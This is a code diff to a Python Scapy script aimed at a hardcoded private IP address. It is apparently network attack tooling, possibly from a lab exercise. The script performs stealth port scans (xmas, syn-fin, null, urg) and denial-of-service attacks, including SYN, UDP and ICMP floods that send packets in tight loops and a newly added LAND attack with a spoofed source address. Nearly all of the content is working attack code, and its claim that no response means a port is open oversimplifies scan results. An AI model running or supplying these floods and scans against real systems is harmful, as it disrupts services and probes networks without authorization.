@@ -2,16 +2,15 @@
 from scapy.all import *
 
 ip = "192.168.210.162"
-openp = []
-filteredp = []
-common_ports = {80, 21, 22, 23, 25}
-common_ports2 = { 21, 22, 23, 25, 53, 69, 80, 88, 109, 110,
-123, 137, 138, 139, 143, 156, 161, 389, 443,
-445, 500, 546, 547, 587, 660, 995, 993, 2086,
-2087, 2082, 2083, 3306, 8443, 10000
-}
+
+common_ports = {80, 21, 22, 23, 25, 53, 443}
 
 def parser():
+	if (len(sys.argv) != 2):
+		print('Possible options: \n\tRecon:\txmas / no-flags / syn-fin\
+/ urg \n\tDoS:\tudp-flood / syn-flood / icmp-flood / land')
+		return
+
 	attack = sys.argv[1]
 	
 	# Recon attacks:
@@ -30,14 +29,16 @@ def parser():
 	elif attack == 'syn-flood':
 		syn_flood_attack();
 	elif attack == 'icmp-flood':
-		syn_flood_attack();
+		icmp_flood_attack();
+	elif attack == 'land':
+		land_attack();
 
 # Recon attacks:
-def xmas_recon():
+def recon(flags_set):
 	for dst_port in common_ports:
-		src_port = RandShort()
-		p = IP(dst=ip)/TCP(sport=src_port, dport=dst_port, flags='FPU')
-		resp = sr1(p,timeout=3) # Sending packet
+		src_port = RandShort()	# Src port is generated randomly
+		p = IP(dst=ip)/TCP(sport=src_port, dport=dst_port, flags=flags_set)
+		resp = sr1(p,timeout=1) # Sending packet
 
 		# No response => port is open
 		if str(type(resp))=="<type 'NoneType'>":
@@ -45,33 +46,35 @@ def xmas_recon():
 		elif resp.haslayer(TCP):
 			if resp.getlayer(TCP).flags == 0x14:
 				print('---> Port ' + str(dst_port) + ' is CLOSED.\n')
-		elif resp.getlayer(ICMP).code in [1,2,3,9,10,13]:
-			print('Filtered.')
+
+def xmas_recon():
+	recon('FPU')
 
 def syn_fin_recon():
-	packet = IP(dst=ip) / TCP(flags="SF")
-	sr(packet)
+	recon('SF')
 
 def no_flags_recon():
-	packet = IP(dst=ip) / TCP(flags="")
-	send(packet)
+	recon('')
 
 def urg_recon():
-	packet = IP(dst=ip) / TCP(flags="U", dport=139)
-	send(packet) 
+	recon('U')
+
 
 # DoS attacks:
 def syn_flood_attack():
-	packet = IP(dst=ip) / TCP(dport=139, flags="S")
+	packet = IP(dst=ip) / TCP(dport=5001, flags="S")
 	send(packet, loop=1, inter=0.005)
 
 def udp_flood_attack():
-	packet = IP(dst=ip) / UDP(dport=20) / ("X" * RandByte()) 
-	send(packet, loop=1, inter=0.005)
+	packet = IP(dst=ip) / UDP(dport=80) / ("X" * RandByte()) 
+	send(packet, loop=1, inter=0.001)
 
 def icmp_flood_attack():
 	packet = IP(dst=ip) / ICMP() / "1234567890"
 	send(packet, loop=1, inter=0.005) 
 
+def land_attack():
+	packet = IP(dst=ip, src=ip) / TCP(sport=80, dport=80, flags="S")
+	send(packet) 
 
 parser();
